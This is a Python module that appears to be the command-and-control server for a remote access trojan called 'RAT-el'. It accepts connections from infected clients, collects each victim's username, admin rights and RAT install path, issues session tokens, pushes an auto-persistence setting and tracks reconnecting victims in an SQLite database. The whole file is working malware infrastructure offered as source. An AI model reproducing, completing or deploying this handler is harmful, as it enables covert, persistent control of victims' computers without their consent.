import socket
import threading
import time
import socket
import os
import binascii
from .other import printColor
from .sql import Sql
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SOCK_TIMEOUT, SPLIT 



class Handler(threading.Thread):
    #Manage incoming connections with a thread system
    dict_conn={}# dict of list | dict = socket,address  Stores all socket, ip, port and connection health status.
    number_conn=0  #count number of connexions
    status_connection_display = True 
    start_handler = False

#    ptable = PrettyTable() #Ascii tables dynamic.
#    ptable.field_names =["Session","IP","Port","Is he alive"] #append title of row.

    def __init__(self,host,port,display,auto_persistence, ObjSql):

        threading.Thread.__init__(self)
        self.port = port 
        self.host = host
        self.sock_server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.display = display
        self.auto_persistence = auto_persistence
        self.ObjSql = ObjSql
        

    def initialization(self):
        """
        filled in the dictionary dict_conn via the database.
        (The socket is not saved by default in the database).
        """
        self.ObjSql.createDb()
        list_of_rows = self.ObjSql.selectAll()

        if(bool(list_of_rows)): #verify if the list is empty
            for row in range(len(list_of_rows)):
                session = list_of_rows[row][0]
                sock = False #
                ip = list_of_rows[row][1]
                port =  "---"
                is_he_alive = False
                is_he_admin = self.ObjSql.setTrueOrFalse(list_of_rows[row][4])
                path_rat = list_of_rows[row][5]
                usename = list_of_rows[row][6]
                token = list_of_rows[row][7]

                #print("---> ",session, ip, port, is_he_alive, is_he_admin, path_rat, usename, token)

                Handler.dict_conn[session] = [session, False, ip, port, is_he_alive, is_he_admin, path_rat, usename, token]
       
                Handler.number_conn = self.ObjSql.returnLastSession() + 1 #ok
                #print(Handler.number_conn) ok
                #print("type of dict_conn ----->",type(Handler.dict_conn[0])) ok
                #print(Handler.dict_conn)


        else:
            print("[?] NOT Value in database.")
            pass
            

    def SuccessfullyQuit(self):
        try:
            print("\n")
            for key,value in Handler.dict_conn.items():
                if(value[NB_ALIVE]):
                    value[NB_SOCKET].close()
                    printColor("error","[-] {}:{} Connection closed.".format(value[NB_IP],value[NB_PORT]))
                
        except Exception  as e: 
            printColor("error","[-] Error closing a socket. Error: {}".format(e))
            pass
        
        self.sock_server.close()
        printColor("error","\r[-] Connexion server closed.")
    
    def run(self):
        Handler.status_connection_display = self.display

        while True:
            #Test if the port listening is good.
            try:
                self.sock_server.bind((self.host,self.port))
                break
            except OSError as e:
                printColor("error","[-] Port {} is already busy or you don't have permission to listen on this port !".format(self.port))
                #printColor("error","[-] "+str(e)+".")
                printColor("information","[?] The server will try again to listen on port {}. If the server is still unable to listen on the port {} make sure to check which service is blocked with: netstat -petulan |grep {} command.".format(self.port,self.port,self.port))
                time.sleep(3)
                print("\n")
                
        Handler.start_handler = True #You can start the management 
        self.sock_server.listen(10)
        while True:               
    
            conn,address = self.sock_server.accept()
            if(Handler.status_connection_display):
                printColor("information","\r[+] New client {}:{}".format(address[0],address[1]))
            else:
                pass
            
            handshake = HandShake(conn,address,self.auto_persistence)
            handshake.daemon = True
            handshake.start()



class HandShake(threading.Thread):
  
    '''
This class is used to manage connections once the accepted function has been called.
Manual control allows to add crucial information like username, RAT and stores etc. to the main dictionary.
The client first sends this information, then the server sends the parameters as auto persistence. 

    '''
    def __init__(self, conn, address, auto_persistence):
        threading.Thread.__init__(self)
        self.conn = conn
        self.address = address
        self.auto_persistence = auto_persistence
        self.ObjSql = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel")

    def generateToken(self):
        return binascii.hexlify(os.urandom(24)).decode("utf8")

    def sendUltraSafe(self, data):
        
        try:
            self.conn.send(data.encode())
            #print("[+] send: ",data)
        except Exception as e:
            print(e)
        else:
            try:
               # print("EN ATTENTE dans la reponse de ultrasafe")
                self.conn.settimeout(SOCK_TIMEOUT)
                confirmation = self.conn.recv(4096).decode("utf8")
            except Exception as e:
                printColor("error","Error in sendUltraSafe: {}\n".format(e))
            else:
                if(confirmation == "confirmation"):
                    print("IN SENDULTRASAFE CONFIRMATION OK")
                else:
                    print("IN SENDULTRASAFE CONFIRMATION NOT OK")
        
        self.conn.settimeout(None)


    def recvUltraSafe(self):
        data = ""
        self.conn.settimeout(SOCK_TIMEOUT)
        try:
            data = self.conn.recv(4096).decode("utf8","replace")
        except socket.timeout:
            print("timeout in recvultrasafe")
        except Exception as e:
            printColor("error", "[-] Error in recvUltraSafe: {} .\n".format(e))
        else:   
            try:
                #print("SEND confirmation in recvultrasafe.")
                self.conn.send(b"confirmation")
            except Exception:
                printColor("error", "[-] Error in recvUltraSafe when confirming.")
 
        self.conn.settimeout(None)
        return data
    

    def recvFirstInfo(self):
        #Collect informations with Handshake client.
        #if the client sends MOD_RECONNECT it means that the client tries to reconnect, to be sure the client sends a tokken.
        #If the client tries to reconnect this function returns a tuple containing (True and the number of sessions).

        list_info = []
        already_in_the_dictionary = False
        
        while True:
            data = self.recvUltraSafe()
            print(data)
            if(data == "\r\n"):
                print("Stop recvFirstInfo")
                break

            tmp = data.split(SPLIT)
            
            print("0 -->",tmp[0])
            print("1 -->",tmp[1])

            if(tmp[0]=="MOD_RECONNECT"): #A changer ! MOD_RECONNECT True | TOKEN fdsafafsdfsadf3454sdfasdf5
                print("MOD RECONNECT DETECT")
                token = tmp[1]
                print("Token recv->", token)
                if bool(Handler.dict_conn): 
                    for value in Handler.dict_conn.values():
                        if(value[NB_TOKEN] == token): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
                            print("!!!!Token doublon!!!!")
                            already_in_the_dictionary = True
                            nb_session_of_conn = value[NB_SESSION]

                else:
                    print("dict empty")
            else:
                list_info.append(tmp[1])

        if(already_in_the_dictionary):
            tpl = already_in_the_dictionary, nb_session_of_conn
            #print("_______",type(tpl))
            return tuple(tpl)
        
        else:
            return list_info


    def sendParameterOfClient(self,token):
        if(self.auto_persistence):
            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE"+SPLIT+"True")
            #print(" SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | True")

        else:
            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE"+SPLIT+"False")
            #print("SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | False")

        self.sendUltraSafe("MOD_HANDSHAKE_TOKEN"+SPLIT+token)        
        #print("SEND TOKEN")
        #time.sleep(0.3)
        self.sendUltraSafe("\r\n") #end echange.
        print("FINISH handshake")


    def run(self):

        self.ObjSql.createDb()
        info = self.recvFirstInfo() #Collect informations with Handshake client. #1
        
        print("test in info ->",info)
        #print("test in info ->",len(info))
        print("test in info ->",type(info))
        if(bool(info)):#if not empty
            #print("sencode part persi go !!!! ")
            if type(info) == list:
                token = self.generateToken()
                self.sendParameterOfClient(token) #2

                if(self.ObjSql.checkFileExists("sql/RAT-el.sqlite3")):
                    self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, info[0], info[1], info[2],token)
                    #print("IP IN DATABASE IS: ", self.ObjSql.returnValue(Handler.number_conn, "socket"))

                Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, info[0], info[1], info[2],token] #3 #True = Connexion is life 
                Handler.number_conn+=1 #4
                #print("type of dict_conn ----->",type(Handler.dict_conn))
        
            if type(info) == tuple:#If the customer tries to reconnect: | return Bool
                print("Reconnect change dict.")
                nb_session = info[1]

                #Session number does not change value
                Handler.dict_conn[nb_session][NB_SOCKET] = self.conn
                Handler.dict_conn[nb_session][NB_IP] = self.address[0]
                Handler.dict_conn[nb_session][NB_PORT] =  int(self.address[1])
                Handler.dict_conn[nb_session][NB_ALIVE] =  True
                #is admin does not change value
                #path does not change value
                #username does not change value
                #The token does not change value

                

        else:
            #if empty,  ignore. If the list is empty, it means that the client sent a mod_reconnect.
            pass 

